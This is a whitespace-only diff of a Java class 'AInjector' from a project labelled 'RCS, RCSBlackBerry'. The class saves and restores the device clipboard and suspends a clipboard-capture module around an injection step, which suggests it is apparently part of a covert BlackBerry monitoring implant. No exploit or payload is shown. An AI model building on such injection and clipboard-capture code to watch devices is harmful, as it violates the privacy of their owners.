@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.injection.injectors;
 
 import net.rim.device.api.system.Clipboard;
@@ -72,7 +72,7 @@ public abstract class AInjector {
         //#ifdef DEBUG
         debug.trace("disableClipboard");
         //#endif
-        clip=Clipboard.getClipboard().get();
+        clip = Clipboard.getClipboard().get();
         ModuleClipboard.getInstance().suspendClip();
     }
 
@@ -81,7 +81,7 @@ public abstract class AInjector {
         debug.trace("enableClipboard");
         //#endif
         ModuleClipboard.getInstance().resumeClip();
-        
+
         try {
             Clipboard.getClipboard().put(clip);
         } catch (Exception ex) {
